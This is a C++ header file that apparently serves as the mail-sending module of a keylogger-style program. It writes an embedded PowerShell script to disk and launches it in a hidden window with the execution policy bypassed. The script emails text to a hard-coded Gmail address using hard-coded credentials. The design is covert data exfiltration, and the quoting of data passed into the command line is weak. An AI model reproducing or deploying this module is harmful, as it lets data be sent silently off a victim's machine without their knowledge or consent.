#ifndef MAIL_H
#define MAIL_H
#include "timer.h"
#include <fstream>
#include <string>
/*
	TEST EMAIL! Make sure you allow less secure applications in your gmail settings 
*/
#define X_EM_TO "example@gmail.com"
#define X_EM_FROM "example@gmail.com"
#define X_EM_PASS "password"
#define SCRIPT_NAME "sm.ps1"

////////////////////////////////Script for email/////////////////////////////////
const std::string &PowerShellScript =
"Param(\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body\r\n        "
")\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n           "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail  "
"-To \"" + std::string(X_EM_TO) + "\"" + " -Body $Body -Subject $Subj "+ "-password \"" + std::string(X_EM_PASS) + "\""+ " -From \"" + std::string(X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
////////////////////////////////////End Script/////////////////////////////////

#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

//Replace the strings from script
std::string StringReplace(std::string s, const std::string &what, const std::string &with)
{
	if (what.empty())
		return s;
	size_t sp = 0;

	while ((sp = s.find(what, sp)) != std::string::npos)
		s.replace(sp, what.length(), with), sp += with.length();
	return s;
}
Timer timer;

//replaces strings in the script and executes powershell script
int SendMail(const std::string &subject, const std::string &body)
{
	bool ok;

	std::ofstream script(std::string(SCRIPT_NAME));
	script << PowerShellScript;
	script.close();
	std::string param = "-ExecutionPolicy ByPass -File \"" + std::string(SCRIPT_NAME) + "\" -Subj \""
		+ StringReplace(subject, "\"", "\\\"") +
		"\" -Body \""
		+ StringReplace(body, "\"", "\\\""); 

	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL; 
	ShExecInfo.lpVerb = "open";
	ShExecInfo.lpFile = "powershell";
	ShExecInfo.lpParameters = param.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	ok = (bool)ShellExecuteEx(&ShExecInfo);
	if (!ok)
		return -1; 

	WaitForSingleObject(ShExecInfo.hProcess, 7000);
	DWORD exit_code = 100;
	GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); 

	timer.set_function([&]()
	{
		WaitForSingleObject(ShExecInfo.hProcess, 60000); 
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
		if ((int)exit_code == STILL_ACTIVE)
			TerminateProcess(ShExecInfo.hProcess, 100);
	});

	timer.set_duration(10L);
	timer.start(true);
	return(int)exit_code;

}

//Test function for Timer
void write_into_file()
{
	std::ofstream file;
	const std::string file_name = "log.txt";
	file.open(file_name, std::ios_base::app);

	file << "This has entered its timer count";

	file.close();


}
#endif